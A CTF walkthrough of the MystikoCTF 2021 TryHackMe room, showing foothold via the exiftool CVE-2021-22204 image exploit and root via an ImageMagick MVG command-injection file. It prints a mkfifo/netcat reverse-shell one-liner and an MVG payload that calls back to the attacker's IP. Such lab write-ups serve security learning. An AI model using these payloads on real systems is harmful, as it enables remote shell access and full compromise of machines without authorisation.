---
title: MystikoCTF - THM - Walkthrough
tags: web, thm, privesc
---

![photo_2021-02-10_22-58-30](https://user-images.githubusercontent.com/84577967/174065612-9a8249f1-005f-4ba3-a752-d4b1ed44df25.jpg){:.circle}

# MystikoCTF 2021

Date: 21<sup>st</sup> / 22<sup>nd</sup> November 2021

## Description

> This is my writeup for the recent ctf hosted by Mystiko, the CTF was hosted on TryHackMe and was too much fun, So I would like to thank the team for making this really challenging and also for the great machine.

- THM Link: [MystikoCTF2021](https://tryhackme.com/room/mystikoctf2021)

- Difficulty: <font size="3" color="orange">Medium</font>

I unfortunately didn't have much time for the whole CTF, but I ended up sharing the third position with `cryptonic007`.

# Enumeration

The CTF had 3 different webapps

> Only PIXEL, DEV01 and DEV02 are in scope for this CTF. Do NOT attack any other IP address or hostname.

So as a start and as usual we should run nmap:

```bash
> nmap -sC -sV 10.10.206.211 -vvv                                             
```
We got 2 opened ports 22 (SSH) and 8080 (Nginx WebServer)

Let's dig into the webserver

![2021-11-22_16-15-23](https://user-images.githubusercontent.com/84577967/174065713-a0a47901-3b89-4414-a30e-02d3615dbe00.png)


We have a kind of images uploader, I opened the source page to see if there is anything hidden as comments but there were nothing, and I also confirmed that its accepting only images.

![2021-11-22_16-17-33](https://user-images.githubusercontent.com/84577967/174065741-f3cc5bfc-daf1-47f3-a4fd-2d14d9f6805e.png)


I had to upload an image and go to burpsuite, to see what going on actually

![2021-11-22_16-21](https://user-images.githubusercontent.com/84577967/174065770-d9db02ce-0dc7-4446-b6f7-f514078ed2f4.png)


I tried to manipulate the file extension and also the Mime Type with multiple methods but nothing was working, but I eventually noticed something in the response

![2021-11-22_16-22](https://user-images.githubusercontent.com/84577967/174065788-51716dc6-0104-47b2-8582-22839af29029.png)


And that was a hidden HTML headings that has some output from the picture I uploaded (mime type,size,image size) and also was starting with a weird `10.61` that looks like a version number !

So I thought probably doing exiftool job, so I had to look for a recent vulnerability of exiftool `CVE-2021-22204` that I had never the chance to try it ... 

# Foothold

I tried multiple public cve's and I eventually ended up with a working one

https://github.com/bilkoh/POC-CVE-2021-22204

Using this command line I was able create the evil picture

![2021-11-22_16-52-54](https://user-images.githubusercontent.com/84577967/174065814-033ab445-5963-42a8-bed3-5bb71f6a41a4.png)


So the picture will download a file `shell.sh` from my attacking webserver and run it

`shell.sh` : 
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.2.95.202 9009 >/tmp/f
```

Let's upload the file 

![2021-11-21_13-29-19](https://user-images.githubusercontent.com/84577967/174065844-908a9f8d-be3d-4845-9b52-38593cb0fe39.png)


So after I set my listener and I uploaded the file I succeeded in getting a reverse shell 

![2021-11-22_16-56-09](https://user-images.githubusercontent.com/84577967/174065877-995382ea-7c6f-4bcb-999e-2fcc57128155.png)


Getting the first flag `local.txt` was pretty easy, the flag was in the home directory of our current user `pixel` and I was able to read it without any restrictions.

![2021-11-21_13-29-07](https://user-images.githubusercontent.com/84577967/174065895-f63a0342-78b3-413c-afe6-74034df064a5.png)


# Privilege Escalation

The first thing I ever do is typing `sudo -l`, to check if there is any commands I can execute with sudo.

![2021-11-21_13-30-34](https://user-images.githubusercontent.com/84577967/174065911-af8a4420-9d19-4ab2-8f98-74feca2b3ed2.png)


Great ! we have a binary named pixel I copied the binary to my machine for some reversing ...

![2021-11-21_13-31-02](https://user-images.githubusercontent.com/84577967/174065932-53d5f67c-92e4-4bf1-9ab0-20a30b8053ee.png)


I also opened it in ghidra, but nothing was too interesting

![2021-11-22_17-19-53](https://user-images.githubusercontent.com/84577967/174065960-2b860b8b-21c9-4215-8fc5-deff78ed1ef8.png)


Then I had to run the binary in my machine to see what this thing is doing actually ...

![2021-11-21_13-31-10](https://user-images.githubusercontent.com/84577967/174065988-93c4886a-cd16-42d4-ae09-18656dc04771.png)


Kind of an Image Toolkit created by `SIXER` team, I choosed to convert an image to a PDF file and see what will happen ...

![2021-11-21_13-32-36](https://user-images.githubusercontent.com/84577967/174066023-b2b56f4d-0d32-4cf4-b132-57be2cb43797.png)


The `Generating PDF` line show us that the binary is using another binary `/usr/local/bin/convert` to convert the image to a PDF file, and I recently just had an experience with the 2016's `convert` exploit, so I quickly go back the Pixel machine and check for the `convert` version

![2021-11-21_13-33-01](https://user-images.githubusercontent.com/84577967/174066040-8cc05195-ad7b-4a72-915a-ee83e6899263.png)


And yes ! the version was vulnerable, so by google `ImageMagick exploit` you will get a bunch of articles that explains this vulnerability and shows multiple ways to exploit it.

So I went with this steps:

1) Go to `/tmp/` directory.

1) Create a new file `exploit.mvg`:

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|nc -e "/bin/sh" "10.2.95.202" "9009)'
pop graphic-context
```
![2021-11-21_13-27-19](https://user-images.githubusercontent.com/84577967/174066067-cb5331e8-00a6-48d7-a851-cbfd26c9fb04.png)


2) Set my listener on port 9009:

  ```
  nc -lvnp 9009
```
3) Run `sudo /usr/bin/pixel` and follow the steps as the image shows (instead of `x.jpg` enter `exploit.mvg`)

![2021-11-21_13-32-36](https://user-images.githubusercontent.com/84577967/174066087-18504f00-3749-4129-90cc-5ab238b6514e.png)


4) Going back to my listener to check if I got a reverse shell:

![2021-11-21_13-35-30](https://user-images.githubusercontent.com/84577967/174066111-a6238dc3-d7b7-48a8-8e7e-474ade679153.png)


And yes ! I was root and able to read the second flag `proof.txt`

![2021-11-22_17-34-28](https://user-images.githubusercontent.com/84577967/174066152-8befadde-2aea-4454-b8ca-e03a52150dc2.png)


---
Hope you enjoyed my writeup like I enjoyed playing the CTF.

Regards,
AB2.